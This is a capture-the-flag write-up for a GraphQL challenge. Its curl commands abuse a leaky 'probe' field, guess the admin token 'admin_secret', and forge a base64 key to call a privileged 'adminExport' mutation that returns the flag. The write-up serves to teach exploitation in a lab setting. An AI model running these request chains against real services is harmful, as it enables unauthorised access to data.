# Project Nebula Write-up

## Challenge Overview
`Project Nebula` runs a web application backed by a GraphQL API. The goal is to interact with the endpoint, uncover hidden fields, and eventually forge a request that returns the flag. An automated PowerShell script (`exploit.ps1`) is provided as an automated approach, but the manual steps below walk through the entire process.

---

## Step-by-Step Manual Exploitation

### 1. Discover the GraphQL endpoint
Browse to the application and open the developer tools (Network tab). Refresh the page and observe a `POST /graphql` request and this is the API we will target.

### 2. Verify basic functionality
Send a simple query to confirm the endpoint works:

```bash
curl -s -X POST http://<target-ip>:<port>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ hello }"}'
```

> **Response:** `{"data":{"hello":"world"}}`

### 3. Probe for hidden fields
A query for `{ probe }` returns an error revealing additional data in the message:

```bash
curl -s -X POST http://<target-ip>:<port>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ probe }"}'
```

> **Error leak:** `probe requires field (leak: __Typename__ProbeError)`

This indicates the `probe` field expects an argument named `leak`.

### 4. Leak the internal key
Use a variable-based query to request the `internalKeyHint` field:

```bash
curl -s -X POST http://<target-ip>:<port>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query P($f:String!){ probe(field:$f) }","variables":{"f":"internalKeyHint"}}'
```

> **Response:** `{"data":{"probe":"INTKEY-fsSIQRtiFeDs"}}`

The application returned an internal key used later in the exploit.

### 5. Leak the secret suffix
Repeating the same request with `random` produces another leak encoded in the error message:

```bash
curl -s -X POST http://<target-ip>:<port>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query P($f:String!){ probe(field:$f) }","variables":{"f":"random"}}'
```

> **Error leak:** `__LEAK__secretSuffix:73336372337453`

### 6. Decode the suffix
The leaked value is hex-encoded. Convert it:

```bash
echo 73336372337453 | xxd -r -p
```

> **Output:** `s3cr3tS`

Now we have the second piece needed for the exploit key.

### 7. Enumerate target IDs
A separate REST endpoint lists items in the system. Fetch it and note the ID

```bash
curl -s http://<target-ip>:<port>/api/items | jq
```

> **Result:** `[{"id": "lsw8I5ln", "name": "testItem"}]`

The `lsw8I5ln` value will be used as the `targetId`.

### 8. Investigate admin operations
A privileged mutation `adminExport` exists but rejects unauthenticated calls.

```bash
curl -s -X POST http://<target-ip>:<port>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ adminExport }"}'
```

> **Error:** `adminExport failed (invalid input)`

### 9. Guess the admin token
The mutation accepts a JSON input containing an authentication token. The correct token isn't documented but the provided PowerShell script suggests `admin_secret`.

```bash
curl -s -X POST http://<target-ip>:<port>/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation M($input: JSON){ adminExport(input:$input) }","variables":{"input":{"auth":{"token":"admin_secret"},"action":"EXPORT","payload":{}}}}'
```

> **Response:** `{"errors":[{"message":"invalid key"}]}` (indicates token is correct)

### 10. Construct the exploit key
Combine the leaked values into the format `<internalKey>:<targetId>:<suffix>` and base64-encode it:

```bash
echo -n 'INTKEY-fsSIQRtiFeDs:lsw8I5ln:s3cr3tS' | base64
```

> **Encoded key:** `SU5US0VZLWZzU0lRUnRpRmVEczpsc3c4STVsbjpzM2NyM1RT`

### 11. Trigger the export
Finally, call `adminExport` with the encoded key and the correct target ID:

```bash
curl -s -X POST http://<target-ip>:<port>/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation Admin($input: JSON){ adminExport(input:$input) }","variables":{"input":{"auth":{"token":"admin_secret"},"action":"EXPORT","payload":{"meta":{"key":"SU5US0VZLWZzU0lRUnRpRmVEczpsc3c4STVsbjpzM2NyM1RT"},"targetId":"lsw8I5ln"}}}}]'
```

> **Success:**
> ```json
> {"data":{"adminExport":{"ok":true,"backup":{"secret":"SEASIDES{gr4phql_h1dd3n_s3cr3t}"}}}}
> ```

The flag appears in the `secret` field of the response.

---

## Conclusion
This challenge hinged on abusing a poorly designed GraphQL field (`probe`) that leaked internal data in both responses and errors—effectively a debug interface. With those leaks we recovered an internal key, a hex‑encoded secret suffix, and other necessary values, then combined them to forge a valid admin export request. The authentication token `admin_secret` was hinted at by the supplied PowerShell script; discovering it by inspection or simple guessing rounds out the attack. In short, the task was less about bypassing complex protections and more about organising scattered information from multiple endpoints and handling the required encoding.

---

*The above steps mirror the behavior of `exploit.ps1` but outline the reasoning behind each request.*
